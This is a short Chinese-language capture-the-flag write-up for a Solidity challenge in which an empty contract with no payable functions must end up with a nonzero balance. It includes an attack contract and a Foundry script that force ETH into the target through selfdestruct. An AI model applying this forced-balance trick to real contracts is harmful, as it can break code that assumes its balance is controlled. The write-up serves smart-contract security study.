合约代码：`Fance.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ 
}
```

题目要求为让合约的余额大于0。

难点是这是一个空合约，没有payable，fallback和receive函数。

思路是创建一个合约，再通过`selfdestruct`强制把合约的余额转给指定地址

攻击合约：`ForceAttack.aol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    constructor() payable {}  // 部署时存入一些 ETH

    function attack(address payable _force) public {
        selfdestruct(_force);  // 销毁合约并强制发送 ETH 到目标地址
    }
}
```

脚本：`Force.s.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/ForceAttack.sol";

contract MyScript is Script {

    address payable _force = payable(0x9868E85a1A9734Bc625fd8A23a795eaAB7172dEB);

    function run() external payable{

        vm.startBroadcast();

        ForceAttack attacker = new ForceAttack{value: 1 ether}();

        attacker.attack(_force);

        vm.stopBroadcast();
    }
}
```

执行脚本，任务完成。
